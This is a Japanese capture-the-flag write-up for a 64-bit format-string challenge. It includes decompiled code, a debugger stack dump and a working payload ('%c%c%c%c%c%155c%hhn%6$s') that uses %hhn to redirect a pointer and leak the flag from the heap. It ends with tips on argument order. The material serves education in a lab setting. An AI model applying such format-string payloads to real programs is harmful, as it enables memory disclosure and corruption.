このwriteupはこちら[https://hackmd.io/@yqroo/ictf2023#Form]を参考にしました。

```
$ file vuln
vuln: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, [略], not stripped

$ pwn checksec vuln
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
```

ghidraで見てみると問題文通りformat stingのエラーがある。

```
void main(void)
{
  size_t length;
  long in_FS_OFFSET;
  char *format_string;
  char **fp_buf;
  FILE *fp;
  undefined8 canary;
  
  canary = *(undefined8 *)(in_FS_OFFSET + 0x28);
  fp_buf = (char **)malloc(0x20);
  format_string = (char *)malloc(0x20);
  setbuf(stdin,(char *)0x0);
  setbuf(stdout,(char *)0x0);
  fp = fopen("flag.txt","r");
  fgets((char *)fp_buf,0x20,fp);
  fgets(format_string,0x20,stdin);
  fp_buf = &format_string;
  length = strlen((char *)fp_buf);
  if (length < 0x18) {
    printf(format_string);
  }
                    /* WARNING: Subroutine does not return */
  _exit(0);
}
```

長さは24まで。exitで終了しているのでfini_arrayの書き換えで何回もとはいかない。またフラグはmallocで確保されているので、書き換える位置を考える必要がある。
printf実行前のスタックとレジスタは以下の通り(思いっきり答え書いちゃってた)。

```
$rax   : 0x0
$rbx   : 0x0
$rcx   : 0x007f468ae36992  →  0x5677fffff0003d48 ("H="?)
$rdx   : 0x007ffe711a4260  →  0x0055da3ff8e2d0  →  "%c%c%c%c%c%155c%hhn%6$s\n"
$rsp   : 0x007ffe711a4260  →  0x0055da3ff8e2d0  →  "%c%c%c%c%c%155c%hhn%6$s\n"
$rbp   : 0x007ffe711a4280  →  0x0000000000000001
$rsi   : 0x007f468af3bb23  →  0xf3da80000000000a ("\n"?)
$rdi   : 0x0055da3ff8e2d0  →  "%c%c%c%c%c%155c%hhn%6$s\n"
$rip   : 0x0055da3fd742d8  →  <main+207> call 0x55da3fd740e0 <printf@plt>
$r8    : 0x0
$r9    : 0x0
$r10   : 0x77
$r11   : 0x246
$r12   : 0x007ffe711a4398  →  0x007ffe711a6492  →  0x53006e6c75762f2e ("./vuln"?)
$r13   : 0x0055da3fd74209  →  <main+0> endbr64
$r14   : 0x0055da3fd76d90  →  0x0055da3fd741c0  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x007f468af93040  →  0x007f468af942e0  →  0x0055da3fd73000  →   jg 0x55da3fd73047
$eflags: [zero CARRY parity ADJUST SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
───── stack ────
0x007ffe711a4260│+0x0000: 0x0055da3ff8e2d0  →  "%c%c%c%c%c%155c%hhn%6$s\n"       ← $rdx, $rsp
0x007ffe711a4268│+0x0008: 0x007ffe711a4260  →  0x0055da3ff8e2d0  →  "%c%c%c%c%c%155c%hhn%6$s\n"
0x007ffe711a4270│+0x0010: 0x0055da3ff8e300  →  0x00000000fbad2488
0x007ffe711a4278│+0x0018: 0x890db47e39d20300

gef➤  search-pattern flag{
[+] Searching 'flag{' in memory
[+] In '[heap]'(0x55da3ff8e000-0x55da3ffaf000), permission=rw-
  0x55da3ff8e2a0 - 0x55da3ff8e2b9  →   "flag{this_is_test_flag}\n"
```

フラグのアドレスとformatを書き込んだアドレスは1byte分しか変わらない(mallocで確保したサイズが小さいので当然だけど)。つまりスタックにあるアドレス(64bitでいうと6番目の引数)下位1byteを0xa0に書き換えてやればいい。

この問題をやるまで知らなかったが、書き込める指定子は%nだけではないらしく
・%hn  2byte
・%hhn 1byte
といったものもある。これを利用して0xa0に書き込み、%6$sでフラグを表示させる。


## Tips
ここで自分用におさらいとして書くが、format_stringは32bitと64bitは表示される順番が異なる(正確に言うと呼び出し規約に依るかもしれない)。
例えば%x.%x.%x.%x.%xの場合
・32bit(cdecl)    各引数に対応したスタックの中身が表示される
・64bit(fastcall) 各引数に対応したレジスタが表示された後、スタックの中身

